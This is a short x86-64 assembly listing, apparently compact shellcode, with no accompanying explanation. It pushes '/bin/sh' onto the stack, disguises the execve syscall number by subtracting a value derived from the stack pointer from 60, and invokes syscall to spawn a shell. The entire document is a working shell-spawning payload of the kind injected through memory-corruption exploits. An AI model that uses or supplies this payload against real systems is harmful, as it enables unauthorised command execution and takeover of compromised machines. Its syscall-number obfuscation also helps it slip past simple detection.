bits 64

mov rax, 0x68732f6e69622f ; /bin/sh
push rax
mov eax, 60
mov rdi, rsp
xor esi, esi
xor edx, edx
mov rcx, rsp
shr rcx, 46 ; 0x00007ffxxxxxxxxx -> 1
sub eax, ecx
syscall
